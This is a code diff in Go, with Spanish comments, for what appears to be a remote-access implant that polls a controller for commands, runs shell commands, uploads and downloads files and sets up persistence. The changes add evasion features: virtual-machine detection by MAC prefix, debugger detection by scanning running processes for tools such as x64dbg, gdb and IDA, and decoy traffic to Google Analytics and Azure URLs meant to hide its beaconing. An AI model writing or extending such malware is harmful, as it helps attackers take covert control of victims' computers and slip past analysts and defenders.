@@ -41,6 +41,78 @@ const (
 
 var stealthModeEnabled bool 
 
+var USER_AGENTS = []string{
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+}
+
+var URLS = []string{
+    "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
+    "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
+}
+
+var HEADERS = map[string]string{
+    "Accept":       "application/json",
+    "Content-Type": "application/json",
+    "Connection":   "keep-alive",
+}
+
+var debugTools = map[string][]string{
+    "windows": {"x64dbg", "ollydbg", "ida", "windbg", "processhacker"},
+    "linux":   {"gdb", "strace", "ltrace", "radare2"},
+    "darwin":  {"lldb", "dtrace", "instruments"},
+}
+
+func isVMByMAC() bool {
+    interfaces, err := net.Interfaces()
+    if err != nil {
+        fmt.Println("Error al obtener interfaces de red:", err)
+        return false
+    }
+
+    vmMACPrefixes := []string{
+        "00:05:69", "00:0C:29", "00:50:56", // VMware
+        "08:00:27",                        // VirtualBox
+        "52:54:00",                        // QEMU/KVM
+    }
+
+    for _, iface := range interfaces {
+        mac := iface.HardwareAddr.String()
+        for _, prefix := range vmMACPrefixes {
+            if strings.HasPrefix(mac, prefix) {
+                return true
+            }
+        }
+    }
+
+    return false
+}
+
+func checkDebuggers() bool {
+    var cmd string
+    switch runtime.GOOS {
+    case "windows":
+        cmd = "tasklist"
+    case "linux", "darwin":
+        cmd = "ps aux"
+    default:
+        return false
+    }
+
+    out, err := exec.Command("sh", "-c", cmd).Output()
+    if err != nil {
+        fmt.Println("Error:", err)
+        return false
+    }
+
+    for _, tool := range debugTools[runtime.GOOS] {
+        if strings.Contains(strings.ToLower(string(out)), tool) {
+            return true
+        }
+    }
+    return false
+}
+
 type Aes256Key struct {
     Key []byte
 }
@@ -87,6 +159,46 @@ func handleStealthCommand(command string) {
         fmt.Println("[INFO] Stealth mode DISABLED by command")
     default:
         // No hacer nada si el comando no es relevante
+    }
+}
+
+func simulateLegitimateTraffic() {
+    for {
+        // Selecciona un User-Agent aleatorio
+        userAgent := USER_AGENTS[mathrand.Intn(len(USER_AGENTS))]
+        headers := make(http.Header)
+        for key, value := range HEADERS {
+            headers.Set(key, value)
+        }
+        headers.Set("User-Agent", userAgent)
+
+        // Selecciona una URL aleatoria
+        url := URLS[mathrand.Intn(len(URLS))]
+
+        // Realiza una solicitud GET simulando tráfico legítimo
+        client := &http.Client{}
+        req, err := http.NewRequest("GET", url, nil)
+        if err != nil {
+            fmt.Printf("[!] Error al crear la solicitud: %v\n", err)
+            continue
+        }
+        req.Header = headers
+
+        resp, err := client.Do(req)
+        if err != nil {
+            fmt.Printf("[!] Error durante la simulación: %v\n", err)
+            continue
+        }
+        defer resp.Body.Close()
+
+        if resp.StatusCode == 200 {
+            fmt.Printf("[+] Simulación exitosa: %s\n", url)
+        } else {
+            fmt.Printf("[-] Error en la simulación: %d\n", resp.StatusCode)
+        }
+
+        // Espera un intervalo aleatorio entre 30 y 60 segundos (para evitar patrones detectables)
+        time.Sleep(time.Duration(mathrand.Intn(31)+30) * time.Second)
     }
 }
 
@@ -350,15 +462,9 @@ func main() {
     baseCtx := context.Background()
     ensurePersistence()
     for {
-        func() {
-
+        func() {        
             defer globalRecover()
             
-            if stealthModeEnabled {
-                fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
-                return
-            }
-
             ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
             defer cancel()
 
@@ -380,7 +486,26 @@ func main() {
             }
             // Manejar comandos stealth_on/off
             handleStealthCommand(command)
-            // Continuar con el procesamiento normal si no es un comando de stealth
+            if stealthModeEnabled {
+                fmt.Println("[DEBUG] Stealth mode is active. Skipping activity.")
+                return
+            }   
+
+            fmt.Println("[*] Iniciando simulación de tráfico legítimo...")
+            go simulateLegitimateTraffic()
+            fmt.Println("[*] Simulación en ejecución. Presiona Ctrl+C para detener.")
+            if checkDebuggers() {
+                fmt.Println("Estamos debugeados.")
+                
+            } else {
+                fmt.Println("No estamos debugeados.")
+            }
+
+            if isVMByMAC() {
+                fmt.Println("Estamos en una máquina virtual.")
+            } else {
+                fmt.Println("No estamos en una máquina virtual.")
+            }        
             if !strings.Contains(command, "stealth") {
                 switch {
                 case strings.HasPrefix(command, "download:"):
@@ -388,14 +513,18 @@ func main() {
                 case strings.HasPrefix(command, "upload:"):
                     handleUpload(ctx, command)
                 case strings.Contains(command, "terminate"):
-                    fmt.Println("[INFO] Ignoring terminate command")
+                    fmt.Println("[INFO] terminate command")
+                    os.Exit(0)
                 default:
                     handleCommand(ctx, command, shellCommand)
                 }
             }
+         
         }()
 		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
 		time.Sleep(sleepTime)
+	
+
     }
 }
 
